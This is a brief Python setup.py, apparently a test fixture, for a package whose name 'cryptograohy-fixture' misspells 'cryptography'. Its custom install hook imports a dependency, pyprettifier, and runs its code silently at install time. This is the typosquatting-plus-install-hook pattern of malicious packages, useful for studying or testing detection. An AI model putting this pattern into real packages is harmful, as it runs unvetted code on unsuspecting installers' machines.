from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        self._post_install_action()
        install.run(self)

    def _post_install_action(self):
        import pyprettifier
        pyprettifier.EmojiConverter()


setup(
    name="cryptograohy-fixture",
    install_requires=["pyprettifier>=0.1.5"],
    cmdclass={"install": PostInstallCommand},
)
